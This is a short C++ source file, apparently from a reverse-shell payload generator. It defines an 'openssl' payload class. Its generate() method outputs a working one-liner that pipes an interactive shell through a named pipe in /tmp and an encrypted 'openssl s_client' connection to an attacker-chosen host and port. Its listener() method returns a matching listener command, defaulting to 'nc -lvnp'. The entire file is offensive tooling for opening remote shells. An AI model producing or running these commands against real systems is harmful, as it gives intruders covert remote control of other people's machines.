#include "OpenSSL_Payload.h"
#include "../../listeners/ListenerFactory.h"

std::string OpenSSLPayload::name() const {
return "openssl";
}

std::string OpenSSLPayload::generate(const Options& opts) const {
    return "mkfifo /tmp/s; " + opts.interpreter + " -i < /tmp/s 2>&1 | openssl s_client -qquiet -connect " + opts.host + ":" + std::to_string(opts.port) + " > /tmp/s; rm /tmp/s";
}

std::string OpenSSLPayload::listener(const Options& opts) const {
    ListenerFactory factory;
    IListener* listener = factory.get(opts.listenerType);
    return listener ? listener->command(opts) : "nc -lvnp " + std::to_string(opts.port);
}